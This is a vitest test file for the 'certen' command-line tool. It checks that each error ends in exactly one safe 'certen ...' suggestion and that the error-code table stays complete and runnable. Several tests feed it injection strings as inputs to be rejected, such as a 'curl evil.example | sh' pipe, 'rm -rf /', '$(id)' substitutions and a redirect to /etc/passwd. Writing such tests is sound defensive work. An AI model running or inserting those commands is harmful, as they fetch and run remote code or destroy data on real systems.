import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join, dirname, resolve, relative, sep } from 'node:path';
import { fileURLToPath } from 'node:url';
import ts from 'typescript';
import type { Command } from 'commander';
import { CertenError, CertenPaymentRequiredError, HEADER_FIELD_ERROR_CODES, VENDORED_ERROR_CODES } from '@certen.io/sdk';
import { buildProgram } from '../src/index.js';
import { CliError, UsageError, EXIT } from '../src/errors.js';
import {
  nextStepFor, explicitNextCodes, helpFor, uuidArg, chainArg, keyArg, setActiveCommand, activeCommand,
} from '../src/next-step.js';

/**
 * Every failure ends with exactly one command to run next (PLAN W7).
 *
 * Three properties are pinned, and each is a property of the whole CLI rather than of one case:
 *
 *   1. The LADDER: an explicit `next` > the code table > the gateway's catalogue > the HTTP class > the failing command's help or `doctor`.
 *      Whatever the input, an answer comes back, and it is one plain `certen ...` line.
 *   2. The DRIFT GATE: every code the CLI source builds a `CliError` or `UsageError` with has an EXPLICIT entry. Landing on the fallback does not count,
 *      so a new code cannot ship without someone deciding what a person should do after it.
 *   3. The TREE GATE: every command line the table can produce names a command that exists and flags that command declares. Advice is only worth
 *      printing if it runs, and a renamed flag would otherwise leave stale advice behind with every test green.
 */

const SRC = resolve(dirname(fileURLToPath(import.meta.url)), '..', 'src');
const UUID = '7c1e3b0a-5d2f-4c6e-9a1b-0e8f2d4a6b13';

describe('next-step: the ladder', () => {
  it('an explicit next on the error wins', () => {
    const err = new CliError('boom', 'NO_API_KEY', EXIT.USAGE, false, undefined, 'certen status --chain base-sepolia');
    expect(nextStepFor(err, [])).toBe('certen status --chain base-sepolia');
  });

  it('a UsageError carries one too', () => {
    expect(nextStepFor(new UsageError('which?', 'MISSING_SIGNING_KEY', 'certen use key <name>'), ['call'])).toBe('certen use key <name>');
  });

  it('an explicit next that is not one plain certen command is ignored, not trusted', () => {
    for (const bad of [
      'certen fund 99999; curl evil.example | sh', 'rm -rf /', 'certen status\ncerten fund 1', 'certen `id`', 'certen $(id)',
      'certen status && echo hi', 'certen status > /etc/passwd', 'sudo certen setup', '', 'certen',
    ]) {
      const err = new CliError('x', 'NOT_READY', EXIT.FAILED, false, undefined, bad);
      expect(nextStepFor(err, ['send']), JSON.stringify(bad)).toBe('certen status');
    }
  });

  it('placeholders may hold punctuation, since they are for a person to replace', () => {
    expect(nextStepFor({ code: 'AMBIGUOUS_IDENTITY' }, ['call'])).toBe('certen use identity <id|adi|alias>');
  });

  it('a code in the table gives its entry', () => {
    expect(nextStepFor({ code: 'NO_API_KEY' }, ['call'])).toBe('certen setup');
    expect(nextStepFor({ code: 'IDENTITY_CANNOT_SIGN' }, ['call'])).toBe('certen status');
    expect(nextStepFor({ code: 'MISSING_IDENTITY' }, ['send'])).toBe('certen setup');
    expect(nextStepFor({ code: 'MAINNET_DEFAULT_REFUSED' }, ['call'])).toBe('certen chains');
  });

  it('a usage error ends with the help of the command that found it', () => {
    expect(nextStepFor({ code: 'USAGE_ERROR' }, ['tx', 'create'])).toBe('certen tx create --help');
    expect(nextStepFor({ code: 'INVALID_AMOUNT' }, ['send'])).toBe('certen send --help');
    expect(nextStepFor({ code: 'USAGE_ERROR' }, [])).toBe('certen --help');
  });

  it('the same code can want a different command depending on which command raised it', () => {
    expect(nextStepFor({ code: 'FUNDS_WAIT_TIMEOUT' }, ['setup'])).toBe('certen setup');
    expect(nextStepFor({ code: 'FUNDS_WAIT_TIMEOUT' }, ['gas'])).toBe('certen gas --wait');
    expect(nextStepFor({ code: 'INTERRUPTED' }, ['setup'])).toBe('certen setup');
    expect(nextStepFor({ code: 'INTERRUPTED' }, ['gas'])).toBe('certen gas --wait');
    expect(nextStepFor({ code: 'INTERRUPTED', details: { intent_id: UUID } }, ['send'])).toBe(`certen watch ${UUID}`);
    expect(nextStepFor({ code: 'NO_API_KEY' }, ['setup'])).toBe('certen setup --existing-account');
    expect(nextStepFor({ code: 'NO_API_KEY' }, ['auth', 'login'])).toBe('certen auth login --help');
    expect(nextStepFor({ code: 'KEY_STORAGE_FAILED' }, ['setup'])).toBe('certen setup --existing-account');
    expect(nextStepFor({ code: 'KEY_STORAGE_FAILED' }, ['auth', 'login'])).toBe('certen auth login --no-keyring');
  });

  it('an unreachable gateway sends you to doctor, unless doctor is what could not reach it', () => {
    expect(nextStepFor({ code: 'NETWORK_ERROR', status: 0 }, ['send'])).toBe('certen doctor');
    expect(nextStepFor({ code: 'NETWORK_ERROR', status: 0 }, ['doctor'])).toBe('certen context');
  });

  it('a wait that ran out, or failed, points at the intent it was waiting for', () => {
    expect(nextStepFor({ code: 'TX_WAIT_TIMEOUT', details: { intent_id: UUID } }, ['tx', 'create'])).toBe(`certen watch ${UUID}`);
    expect(nextStepFor({ code: 'TX_FAILED', details: { intent_id: UUID } }, ['call'])).toBe(`certen receipt ${UUID}`);
    // The SDK's own errors name the id in camelCase.
    expect(nextStepFor(new CertenError('slow', 0, 'WAIT_TIMEOUT', { details: { intentId: UUID } }), ['proof', 'get'])).toBe(`certen watch ${UUID}`);
  });

  it('a gas failure names the chain it is about', () => {
    expect(nextStepFor({ code: 'ABSTRACT_ACCOUNT_UNFUNDED', details: { chain: 'base-sepolia' } }, ['call'])).toBe('certen gas --chain base-sepolia --wait');
    expect(nextStepFor({ code: 'ABSTRACT_ACCOUNT_UNFUNDED' }, ['call'])).toBe('certen gas --chain <chain> --wait');
  });

  it('a code the gateway publishes, and the table does not cover, is explained by `certen errors`', () => {
    expect(nextStepFor(new CertenError('slow down', 429, 'RATE_LIMIT_EXCEEDED'), ['tx', 'list'])).toBe('certen errors RATE_LIMIT_EXCEEDED');
    expect(nextStepFor(new CertenError('quota', 429, 'PLAN_QUOTA_EXCEEDED'), ['send'])).toBe('certen errors PLAN_QUOTA_EXCEEDED');
    expect(nextStepFor(new CertenError('nope', 404, 'NOT_FOUND'), ['identity', 'get'])).toBe('certen errors NOT_FOUND');
    expect(nextStepFor(new CertenError('replay', 409, 'IDEMPOTENCY_KEY_IN_FLIGHT'), ['send'])).toBe('certen errors IDEMPOTENCY_KEY_IN_FLIGHT');
  });

  it('a refusal for money sends you to fund', () => {
    expect(nextStepFor(new CertenPaymentRequiredError('pay', 402, 'PAYMENT_REQUIRED'), ['send'])).toBe('certen fund <usd>');
    expect(nextStepFor(new CertenError('low', 402, 'INSUFFICIENT_BALANCE'), ['send'])).toBe('certen fund <usd>');
  });

  it('a gateway code nobody has heard of is placed by its HTTP class', () => {
    expect(nextStepFor(new CertenError('x', 401, 'SOMETHING_NEW'), ['whoami'])).toBe('certen setup --existing-account');
    expect(nextStepFor(new CertenError('x', 403, 'SOMETHING_NEW'), ['admin', 'list'])).toBe('certen whoami');
    expect(nextStepFor(new CertenError('x', 402, 'SOMETHING_NEW'), ['send'])).toBe('certen fund <usd>');
    expect(nextStepFor(new CertenError('x', 503, 'SOMETHING_NEW'), ['send'])).toBe('certen doctor');
    expect(nextStepFor(new CertenError('x', 418, 'SOMETHING_NEW'), ['send'])).toBe('certen send --help');
    expect(nextStepFor(new CertenError('x', 0, 'SOMETHING_NEW'), ['send'])).toBe('certen doctor');
  });

  it('an untyped failure ends with the failing command\'s help, not doctor (doctor diagnoses the gateway and the credential)', () => {
    expect(nextStepFor(new Error('No key named "dev".'), ['keys', 'show'])).toBe('certen keys show --help');
    expect(nextStepFor(undefined, [])).toBe('certen --help');
    expect(nextStepFor('a string', ['status'])).toBe('certen status --help');
  });

  it('the key store\'s typed answers each end in one command that helps: look at the keys, find the file, or re-check the passphrase', () => {
    expect(nextStepFor({ code: 'UNKNOWN_KEY' }, ['keys', 'show'])).toBe('certen keys list');
    expect(nextStepFor({ code: 'KEY_EXISTS' }, ['keys', 'generate'])).toBe('certen keys list');
    expect(nextStepFor({ code: 'KEY_FILE_CORRUPT' }, ['keys', 'show'])).toBe('certen keys path');
    expect(nextStepFor({ code: 'KEY_FILE_INSECURE' }, ['send'])).toBe('certen keys path');
    expect(nextStepFor({ code: 'KEY_FILE_UNSUPPORTED' }, ['send'])).toBe('certen keys path');
    expect(nextStepFor({ code: 'WRONG_PASSPHRASE', details: { key: 'dev' } }, ['send'])).toBe('certen keys verify dev');
    // A mistake in what was typed is answered by the help of the command it was typed to.
    for (const code of ['INVALID_KEY_NAME', 'INVALID_HASH', 'PASSPHRASE_MISMATCH', 'NO_TTY']) {
      expect(nextStepFor({ code }, ['keys', 'generate']), code).toBe('certen keys generate --help');
    }
  });

  it('a typed failure nobody classified falls through to doctor', () => {
    expect(nextStepFor({ code: 'SOMETHING_ELSE' }, ['send'])).toBe('certen doctor');
  });

  it('uses the command recorded by setActiveCommand when none is passed', () => {
    setActiveCommand(['receipt']);
    try {
      expect(activeCommand()).toEqual(['receipt']);
      expect(nextStepFor({ code: 'USAGE_ERROR' })).toBe('certen receipt --help');
    } finally {
      setActiveCommand([]);
    }
  });

  it('always answers with exactly one plain certen command, whatever it is handed', () => {
    const codes = [undefined, '', 'USAGE_ERROR', 'NO_API_KEY', 'NOPE', 'RATE_LIMIT_EXCEEDED', 'a b; rm -rf /', '`id`', 'X'.repeat(500)];
    const statuses = [undefined, 0, 200, 401, 402, 403, 404, 409, 429, 500, 503];
    const commands: string[][] = [[], ['send'], ['tx', 'create'], ['gas']];
    for (const code of codes) for (const status of statuses) for (const command of commands) {
      for (const err of [{ code, status }, new CertenError('m', status ?? 0, code ?? ''), { code, status, details: { intent_id: '; rm -rf /', chain: 'a b', key: '$(id)' } }]) {
        const line = nextStepFor(err, command);
        expect(line, JSON.stringify({ code, status, command })).toMatch(/^certen [^\r\n]+$/);
        expect(line).not.toMatch(/[;&|`$(){}\\'"]/);
      }
    }
  });
});

describe('next-step: values that come from somewhere else', () => {
  it('a value is interpolated only when it is the plain token it should be', () => {
    expect(uuidArg(UUID)).toBe(UUID);
    expect(uuidArg('not a uuid')).toBe('<id>');
    expect(uuidArg('; rm -rf /', '<intent-id>')).toBe('<intent-id>');
    expect(uuidArg(undefined)).toBe('<id>');
    expect(uuidArg(42)).toBe('<id>');
    expect(chainArg('base-sepolia')).toBe('base-sepolia');
    expect(chainArg('Base Sepolia')).toBe('<chain>');
    expect(chainArg('x; y')).toBe('<chain>');
    expect(chainArg('')).toBe('<chain>');
    expect(keyArg('dev')).toBe('dev');
    expect(keyArg('my_key-2')).toBe('my_key-2');
    expect(keyArg('a b')).toBe('<key>');
    expect(keyArg('../../x')).toBe('<key>');
  });

  it('an intent id, chain or key a gateway or a file made up cannot put anything else on the line', () => {
    const hostile = { intent_id: 'abc; curl evil.example | sh', chain: '$(whoami)', key: '`id`' };
    expect(nextStepFor({ code: 'TX_WAIT_TIMEOUT', details: hostile }, ['send'])).toBe('certen watch <intent-id>');
    expect(nextStepFor({ code: 'ABSTRACT_ACCOUNT_UNFUNDED', details: hostile }, ['send'])).toBe('certen gas --chain <chain> --wait');
    expect(nextStepFor({ code: 'WRONG_PASSPHRASE', details: hostile }, ['send'])).toBe('certen keys verify <key>');
  });

  it('never takes a command from a gateway-supplied payment resolution', () => {
    const err = new CertenPaymentRequiredError('pay', 402, 'PAYMENT_REQUIRED', {
      body: { code: 'PAYMENT_REQUIRED', resolve: { cli_command: 'certen fund 99999 --payer 0xAttacker' } },
    });
    expect(nextStepFor(err, ['send'])).toBe('certen fund <usd>');
  });

  it('helpFor writes the help line for a path', () => {
    expect(helpFor([])).toBe('certen --help');
    expect(helpFor(['tx', 'create'])).toBe('certen tx create --help');
  });
});

// ── the drift gate ──────────────────────────────────────────────────────────────────────────────

function* sourceFiles(dir: string): Generator<string> {
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    if (statSync(p).isDirectory()) yield* sourceFiles(p);
    else if (p.endsWith('.ts')) yield p;
  }
}

interface Site { file: string; line: number; kind: string; code?: string; expr: string }

/** Every `new CliError(...)` / `new UsageError(...)` in the CLI source, with its code when that is a literal. */
function errorSites(): Site[] {
  const sites: Site[] = [];
  for (const file of sourceFiles(SRC)) {
    const sf = ts.createSourceFile(file, readFileSync(file, 'utf8'), ts.ScriptTarget.Latest, true);
    const visit = (node: ts.Node): void => {
      if (ts.isNewExpression(node) && ts.isIdentifier(node.expression) && ['CliError', 'UsageError'].includes(node.expression.text)) {
        const kind = node.expression.text;
        const arg = node.arguments?.[1];
        const rel = relative(SRC, file).split(sep).join('/');
        const line = sf.getLineAndCharacterOfPosition(node.getStart()).line + 1;
        if (arg === undefined) sites.push({ file: rel, line, kind, ...(kind === 'UsageError' ? { code: 'USAGE_ERROR' } : {}), expr: '(none)' });
        else if (ts.isStringLiteral(arg) || ts.isNoSubstitutionTemplateLiteral(arg)) sites.push({ file: rel, line, kind, code: arg.text, expr: arg.getText() });
        else sites.push({ file: rel, line, kind, expr: arg.getText().replace(/\s+/g, ' ') });
      }
      ts.forEachChild(node, visit);
    };
    visit(sf);
  }
  return sites;
}

describe('next-step: the drift gate', () => {
  const sites = errorSites();
  const explicit = new Set(explicitNextCodes());

  it('finds the error sites at all (a scan that matches nothing would pass every check below)', () => {
    expect(sites.length).toBeGreaterThan(150);
    expect(sites.filter((s) => s.code !== undefined).length).toBeGreaterThan(100);
  });

  it('every code a CliError or UsageError is built with has an EXPLICIT entry', () => {
    const missing = [...new Set(sites.filter((s) => s.code !== undefined && !explicit.has(s.code)).map((s) => s.code!))].sort();
    expect(missing, `add these to STEPS in next-step.ts (a person needs a next command after each):\n  ${missing.join('\n  ')}`).toEqual([]);
  });

  it('every entry in the table is a code something can still raise (so the table is not a graveyard)', () => {
    const raised = new Set(sites.flatMap((s) => (s.code ? [s.code] : [])));
    // Codes raised somewhere other than a CliError literal: the SDK (client side), the gateway, commander, and the dynamic sites below.
    const elsewhere = new Set<string>([
      'USAGE_ERROR', 'UNKNOWN_ERROR', 'NETWORK_ERROR', 'WAIT_TIMEOUT', 'WAIT_ABORTED', 'INTENT_FAILED', 'PROOF_NOT_ASSIGNED', 'FOREIGN_ORIGIN_URL',
      'INVALID_PATH_PARAMETER', 'EVM_RPC_CHAIN_UNKNOWN', 'EVM_RPC_ERROR', 'EVM_RPC_INVALID', 'EVM_RPC_UNREADABLE', 'EVM_RPC_WRONG_CHAIN', 'GAS_UNREADABLE', 'NOT_CONFIRMED', 'NOT_READY', 'UNAUTHORIZED', 'FORBIDDEN', 'PAYMENT_REQUIRED', 'INSUFFICIENT_BALANCE',
      'VALIDATION_ERROR', 'BAD_REQUEST', 'CHAIN_NOT_ENABLED', 'CHAIN_UNRESOLVED', 'UNKNOWN_CHAIN',
      // What the gateway answers on the reads added with its newer routes (or the SDK, for a route the gateway does not serve).
      'BALANCE_UNREADABLE', 'ENDPOINT_NOT_ON_GATEWAY', 'PROOF_V2_NOT_AVAILABLE',
      // The refusals of the two routes that spend the platform's funds (credits for a key page, gas for an account), as the gateway states them.
      'CREDIT_TOPUP_DISABLED', 'CREDIT_TOPUP_LIMIT', 'DRIP_DISABLED', 'DRIP_LIMIT', 'DRIP_RECIPIENT_REJECTS', 'DRIP_TESTNET_ONLY', 'DRIP_UNAVAILABLE',
      // The gateway's refusal of a spend with no Idempotency-Key, which the CLI never sends without one; it is explained all the same.
      'IDEMPOTENCY_KEY_REQUIRED',
      ...HEADER_FIELD_ERROR_CODES,
    ]);
    const stale = [...explicit].filter((c) => !raised.has(c) && !elsewhere.has(c)).sort();
    expect(stale, `no longer raised anywhere; delete from STEPS:\n  ${stale.join('\n  ')}`).toEqual([]);
  });

  it('the sites whose code is computed are the ones known, each placed by the ladder', () => {
    // A computed code (`err.code`, a readiness check's code) cannot be listed. Each such site passes a code on from somewhere that is covered:
    // an SDK or gateway error, or a readiness check whose code the table holds. A NEW one must be looked at, then added here.
    const dynamic = sites.filter((s) => s.code === undefined).map((s) => `${s.file} ${s.expr}`).sort();
    expect(dynamic).toEqual([
      'command-context.ts err.code',
      'commands/gas.ts check.code ?? \'ABSTRACT_ACCOUNT_UNFUNDED\'',
      'commands/gas.ts check.code ?? \'GAS_UNREADABLE\'',
      // A refusal of a drip, carried on with the plan attached (the same code, so the ladder places it as it would have).
      'commands/gas.ts err.code',
      'commands/proof-verify.ts err.code',
      'commands/proof-verify.ts err.code',
      'commands/proof-verify.ts err.code',
      'commands/send.ts err instanceof CertenError ? err.code : \'INVALID_RPC\'',
      'commands/send.ts down ? \'NETWORK_ERROR\' : \'NOT_READY\'',
      'commands/setup.ts base.code',
      'commands/status.ts err.code',
      'commands/status.ts down ? \'NETWORK_ERROR\' : r.state === \'blocked\' ? \'NOT_READY\' : \'NOT_CONFIRMED\'',
      'duration.ts code',
      'header-flags.ts code',
      'receipt-flow.ts err.code',
      // The gateway's refusal of a spend, said in plain words under the code it came with.
      'spend.ts err.code',
    ].sort());
  });

  it('every code the SDK keeps for the gateway resolves to a command, by the table or by `certen errors`', () => {
    for (const code of VENDORED_ERROR_CODES) {
      const line = nextStepFor(new CertenError('m', 400, code), ['send']);
      expect(line, code).toMatch(/^certen /);
      expect(line, code).not.toBe('certen doctor');
    }
  });

  it('every code in spec/errors.json is one the SDK knows (so the check above is not missing any)', () => {
    const catalogue = JSON.parse(readFileSync(resolve(SRC, '..', '..', '..', 'spec', 'errors.json'), 'utf8')) as { errors: Array<{ code: string }> };
    expect(catalogue.errors.map((e) => e.code).sort()).toEqual([...VENDORED_ERROR_CODES].sort());
  });

  it('the SDK\'s own client-side codes are explicit too', () => {
    for (const code of ['NETWORK_ERROR', 'WAIT_TIMEOUT', 'WAIT_ABORTED', 'INTENT_FAILED', 'PROOF_NOT_ASSIGNED', 'FOREIGN_ORIGIN_URL', 'INVALID_PATH_PARAMETER', 'EVM_RPC_CHAIN_UNKNOWN', 'EVM_RPC_ERROR', 'EVM_RPC_INVALID', 'EVM_RPC_UNREADABLE', 'EVM_RPC_WRONG_CHAIN', ...HEADER_FIELD_ERROR_CODES]) {
      expect(explicit.has(code), code).toBe(true);
    }
  });

  it('every code the gateway\'s newer routes add (and the SDK\'s own for them) has an EXPLICIT entry, not only the catalogue\'s fallback', () => {
    for (const code of [
      'BALANCE_UNREADABLE', 'CREDIT_TOPUP_DISABLED', 'CREDIT_TOPUP_LIMIT', 'DRIP_DISABLED', 'DRIP_LIMIT', 'DRIP_RECIPIENT_REJECTS', 'DRIP_TESTNET_ONLY',
      'DRIP_UNAVAILABLE', 'IDEMPOTENCY_KEY_REQUIRED', 'INVALID_ADDRESS', 'PROOF_V2_NOT_AVAILABLE', 'INVALID_CREDITS', 'ENDPOINT_NOT_ON_GATEWAY',
    ]) {
      expect(explicit.has(code), code).toBe(true);
    }
  });
});

describe('next-step: the commands that read an address, estimate, or spend the platform\'s funds', () => {
  const chain = { chain: 'base-sepolia' };

  it('a balance that could not be read is read again; a gateway without a route is diagnosed', () => {
    expect(nextStepFor(new CertenError('x', 503, 'BALANCE_UNREADABLE'), ['balance'])).toBe('certen balance <address> --chain <chain>');
    expect(nextStepFor(new CertenError('x', 404, 'ENDPOINT_NOT_ON_GATEWAY'), ['quote'])).toBe('certen doctor');
    expect(nextStepFor(new CertenError('x', 404, 'PROOF_V2_NOT_AVAILABLE'), ['proof', 'verify'])).toBe('certen proof get <id>');
  });

  it('whatever became of a credit top-up, the credits are the next thing to read', () => {
    for (const code of ['CREDIT_TOPUP_DISABLED', 'CREDIT_TOPUP_LIMIT', 'CREDIT_TOPUP_UNCONFIRMED', 'TOPUP_DECLINED']) {
      expect(nextStepFor({ code }, ['credits', 'topup']), code).toBe('certen identity readiness');
    }
  });

  it('whatever became of a drip, the wait for the gas names the chain it is about (and only a plain token of it)', () => {
    for (const code of ['DRIP_DISABLED', 'DRIP_TESTNET_ONLY', 'DRIP_LIMIT', 'DRIP_UNAVAILABLE', 'DRIP_UNCONFIRMED', 'DRIP_DECLINED']) {
      expect(nextStepFor({ code, details: chain }, ['gas']), code).toBe('certen gas --chain base-sepolia --wait');
      expect(nextStepFor({ code, details: { chain: '$(whoami)' } }, ['gas']), code).toBe('certen gas --chain <chain> --wait');
    }
    expect(nextStepFor({ code: 'DRIP_RECIPIENT_REJECTS', details: chain }, ['gas'])).toBe('certen gas --chain base-sepolia');
  });

  it('a count of credits or a key that is refused is answered by the help of the command it was typed to', () => {
    expect(nextStepFor({ code: 'INVALID_CREDITS' }, ['credits', 'topup'])).toBe('certen credits topup --help');
    expect(nextStepFor({ code: 'INVALID_IDEMPOTENCY_KEY' }, ['gas'])).toBe('certen gas --help');
    expect(nextStepFor({ code: 'IDEMPOTENCY_KEY_REQUIRED' }, ['credits', 'topup'])).toBe('certen credits topup --help');
  });
});

// ── the tree gate ───────────────────────────────────────────────────────────────────────────────

const GLOBAL_FLAGS = new Set(['--json', '--profile', '--help', '--version']);

function child(cmd: Command, name: string): Command | undefined {
  return cmd.commands.find((c) => c.name() === name || c.aliases().includes(name)) as Command | undefined;
}

/** Why a line would not run, or undefined when it would: the command exists, its flags exist, and it is not given more arguments than it takes. */
export function whyNotRunnable(program: Command, line: string): string | undefined {
  const tokens = line.trim().split(/\s+/);
  if (tokens[0] !== 'certen') return 'does not start with certen';
  let cmd: Command = program;
  const path: string[] = [];
  const positionals: string[] = [];
  const flags: string[] = [];

  // The command is the leading run of words that name subcommands; the rest are flags (with their values) and positional arguments.
  let i = 1;
  for (; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t.startsWith('-') || t.startsWith('<')) break;
    const sub = child(cmd, t);
    if (!sub) break;
    cmd = sub;
    path.push(t);
  }
  for (; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t.startsWith('--')) {
      flags.push(t);
      const opt = cmd.options.find((o) => o.long === t);
      // A flag that takes a value takes the next word with it, so that word is not a positional argument.
      if (opt && (opt.required || opt.optional) && i + 1 < tokens.length && !tokens[i + 1]!.startsWith('--')) i++;
      continue;
    }
    if (t.startsWith('-') && !t.startsWith('<')) return `short flag ${t} is not used in advice`;
    positionals.push(t);
  }
  const named = path.join(' ') || '(root)';
  for (const f of flags) {
    if (GLOBAL_FLAGS.has(f)) continue;
    if (!cmd.options.some((o) => o.long === f)) return `${named} has no ${f}`;
  }
  if (flags.includes('--help')) return undefined;
  if (cmd.commands.length > 0 && positionals.length > 0 && path.length > 0 && !cmd.registeredArguments.length) {
    return `${named} is a group; ${positionals[0]} is not one of its commands`;
  }
  if (path.length === 0) return 'names no command';
  const accepts = cmd.registeredArguments;
  const variadic = accepts.some((a) => a.variadic);
  if (!variadic && positionals.length > accepts.length) return `${named} takes ${accepts.length} argument(s), the line gives ${positionals.length}`;
  return undefined;
}

describe('next-step: the tree gate', () => {
  const program = buildProgram();

  it('the checker itself rejects what it should (a check that accepts anything would pass the table)', () => {
    expect(whyNotRunnable(program, 'certen status')).toBeUndefined();
    expect(whyNotRunnable(program, 'certen gas --chain <chain> --wait')).toBeUndefined();
    expect(whyNotRunnable(program, 'certen tx create --help')).toBeUndefined();
    expect(whyNotRunnable(program, 'certen --help')).toBeUndefined();
    expect(whyNotRunnable(program, 'certen nonesuch')).toBeDefined();
    expect(whyNotRunnable(program, 'certen status --no-such-flag')).toMatch(/no --no-such-flag/);
    expect(whyNotRunnable(program, 'certen tx nonesuch --help')).toBeUndefined(); // --help on whatever resolved; the walk stops at tx
    expect(whyNotRunnable(program, 'certen keys nonesuch')).toMatch(/group/);
    expect(whyNotRunnable(program, 'certen fund 1 2 3')).toMatch(/takes 1 argument/);
    expect(whyNotRunnable(program, 'sudo certen status')).toBeDefined();
  });

  const matrix: string[][] = [
    [], ['setup'], ['gas'], ['doctor'], ['status'], ['send'], ['call'], ['tx', 'create'], ['auth', 'login'], ['keys', 'show'], ['receipt'], ['watch'],
    ['identity', 'create'], ['governance'], ['pending', 'sign'], ['proof', 'verify'], ['use', 'identity'], ['fund'],
    ['keys', 'unlock'], ['keys', 'lock'],
  ];

  function exists(path: string[]): boolean {
    let cmd: Command = program;
    for (const p of path) { const c = child(cmd, p); if (!c) return false; cmd = c; }
    return true;
  }

  it('every command in the matrix exists (so the help lines it produces are checked against something real)', () => {
    for (const path of matrix) expect(exists(path), path.join(' ')).toBe(true);
  });

  it('every line the table can produce is a command that runs', () => {
    const details = [
      {}, { intent_id: UUID, chain: 'base-sepolia', key: 'dev' }, { intentId: UUID },
      { intent_id: 'bad one', chain: 'BAD', key: '../x' },
    ];
    const problems: string[] = [];
    for (const code of explicitNextCodes()) {
      for (const command of matrix) for (const d of details) {
        const line = nextStepFor({ code, details: d }, command);
        const why = whyNotRunnable(program, line);
        if (why) problems.push(`${code} (${command.join(' ') || 'root'}) -> ${line}: ${why}`);
      }
    }
    expect([...new Set(problems)]).toEqual([]);
  });

  it('the catalogue and the status-class lines run too', () => {
    const lines = new Set<string>();
    for (const code of VENDORED_ERROR_CODES) lines.add(nextStepFor(new CertenError('m', 400, code), ['send']));
    for (const status of [0, 401, 402, 403, 404, 418, 500, 503]) lines.add(nextStepFor(new CertenError('m', status, 'SOMETHING_NEW'), ['send']));
    lines.add(nextStepFor({ code: 'SOMETHING_ELSE' }, ['send']));
    lines.add(nextStepFor(new Error('x'), []));
    const problems = [...lines].map((l) => [l, whyNotRunnable(program, l)] as const).filter(([, why]) => why);
    expect(problems).toEqual([]);
  });

  it('the explicit nexts the throw sites build run, for a real value and for a hostile one', () => {
    const samples = [
      `certen gas --chain base-sepolia --wait`, `certen status --chain base-sepolia`,
      `certen identity link-chain ${UUID} --chain base-sepolia`, `certen identity link-chain <id> --chain <chain>`,
      `certen identity retire ${UUID} --yes`, 'certen use key <name>', 'certen setup', `certen keys verify dev`,
      `certen receipt ${UUID}`, `certen tx status ${UUID} --wait`, 'certen receipt <intent-id>', 'certen tx status <intent-id> --wait',
    ];
    for (const line of samples) expect(whyNotRunnable(program, line), line).toBeUndefined();
  });
});
